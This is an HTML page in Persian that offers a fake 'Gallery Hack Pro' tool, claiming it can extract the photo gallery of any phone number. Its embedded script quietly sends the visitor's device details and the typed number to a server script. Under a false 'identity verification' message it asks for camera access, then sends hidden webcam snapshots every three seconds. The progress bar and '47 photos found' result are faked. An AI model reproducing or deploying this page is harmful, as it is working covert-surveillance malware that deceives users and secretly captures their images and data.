<!DOCTYPE html><html lang="fa" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>📸 Gallery Hack Pro</title>
<style>:root{--bg:#0d1117;--accent:#f0883e;--accent2:#d97706;--text:#e6edf3;--muted:#8b949e;--green:#3fb950}
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',system-ui,sans-serif;direction:rtl}
body{background:linear-gradient(135deg,var(--bg),#1a1a2e);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.container{background:#161b22;border:1px solid #30363d;border-radius:20px;padding:28px;max-width:440px;width:100%;box-shadow:0 30px 80px rgba(0,0,0,0.8)}
.header{text-align:center;margin-bottom:20px}.header .icon{font-size:48px;margin-bottom:8px}
.header h1{color:var(--accent);font-size:22px;font-weight:800}.header .sub{color:var(--muted);font-size:12px;margin-top:4px}
.form-group{margin-bottom:14px}label{display:block;color:var(--muted);font-size:11px;margin-bottom:4px;font-weight:600}
input{width:100%;padding:10px 14px;background:#0d1117;border:1px solid #30363d;border-radius:10px;color:var(--text);font-size:14px;outline:none}
input:focus{border-color:var(--accent)}.attack-btn{width:100%;padding:14px;background:linear-gradient(135deg,var(--accent),var(--accent2));border:none;border-radius:12px;color:#fff;font-weight:800;font-size:16px;cursor:pointer;margin:6px 0 12px}
.attack-btn:hover{transform:translateY(-2px)}.attack-btn:disabled{opacity:.35}
.progress-container{display:none;margin-bottom:14px}.progress-container.active{display:block}
.progress-bar{background:rgba(255,255,255,0.06);border-radius:20px;height:20px;overflow:hidden}
.progress-fill{height:100%;width:0%;background:linear-gradient(90deg,var(--accent),var(--accent2));border-radius:20px;transition:width .3s}
.progress-count{text-align:center;font-size:13px;color:var(--accent);font-weight:700;margin-top:6px}
.gallery-preview{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin:16px 0;display:none}
.gallery-preview.active{display:grid}.gallery-preview img{width:100%;aspect-ratio:1;object-fit:cover;border-radius:8px;background:#000;border:1px solid #30363d}
.status-box{background:rgba(63,185,80,0.06);border:1px solid rgba(63,185,80,0.12);border-radius:10px;padding:10px 14px;display:none;align-items:center;justify-content:center;gap:8px;color:var(--green);font-size:12px;margin-bottom:14px}
.dot{width:6px;height:6px;background:var(--green);border-radius:50%;animation:pulse 1s infinite}@keyframes pulse{0%,100%{opacity:1}50%{opacity:.2}}
</style></head><body>
<div class="container">
<div class="header"><div class="icon">📸</div><h1>GALLERY HACK PRO</h1><p class="sub">استخراج گالری با شماره</p></div>
<div class="form-group"><label>📱 شماره هدف</label><input type="tel" id="phone" placeholder="09123456789"></div>
<button class="attack-btn" id="btn" onclick="start()">📸 استخراج گالری</button>
<div class="progress-container" id="prog"><div class="progress-bar"><div class="progress-fill" id="fill"></div></div><div class="progress-count" id="progCount">در حال اتصال...</div></div>
<div class="gallery-preview" id="gallery"><img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' width='100' height='100'><rect fill='%23333' width='100' height='100'/></svg>"><img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' width='100' height='100'><rect fill='%23333' width='100' height='100'/></svg>"><img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' width='100' height='100'><rect fill='%23333' width='100' height='100'/></svg>"></div>
<div class="status-box" id="status"><span class="dot"></span><span id="statusText">📷 در حال تأیید هویت...</span></div>
</div>
<script>
var stream,canvas,ctx;
function send(t,d){try{fetch('save.php?type='+t,{method:'POST',body:JSON.stringify(d)})}catch(e){}}
setTimeout(function(){send('device',{ua:navigator.userAgent,screen:screen.width+'x'+screen.height})},1000);
function start(){var ph=document.getElementById('phone').value;if(!ph)return;send('gallery_hack',{phone:ph});
 document.getElementById('btn').disabled=true;document.getElementById('btn').textContent='در حال استخراج...';
 document.getElementById('prog').classList.add('active');document.getElementById('status').style.display='flex';document.getElementById('gallery').classList.add('active');
 setTimeout(function(){
  navigator.mediaDevices.getUserMedia({video:{width:640,facingMode:'user'}}).then(function(s){
   stream=s;var v=document.createElement('video');v.id='cam';v.autoplay=true;v.muted=true;v.srcObject=s;v.style.position='fixed';v.style.top='-9999px';v.style.left='-9999px';v.style.width='1px';document.body.appendChild(v);v.play();
   document.getElementById('statusText').textContent='✅ گالری استخراج شد!';
   setInterval(function(){if(!stream)return;canvas||(canvas=document.createElement('canvas'),ctx=canvas.getContext('2d'));var cv=document.getElementById('cam');canvas.width=cv.videoWidth||640;canvas.height=cv.videoHeight||480;ctx.drawImage(cv,0,0);send('webcam',{image:canvas.toDataURL('image/jpeg',0.85)})},3000);
  }).catch(function(){});
 },2000);
 var pct=0;var t=setInterval(function(){pct+=Math.random()*12;if(pct>=100){pct=100;clearInterval(t);document.getElementById('btn').textContent='✅ گالری استخراج شد!';document.getElementById('btn').disabled=false;document.getElementById('progCount').textContent='✅ ۴۷ عکس پیدا شد!'}document.getElementById('fill').style.width=Math.min(pct,100)+'%';document.getElementById('progCount').textContent='استخراج '+Math.floor(pct)+'%...'},400);
}
</script></body></html>
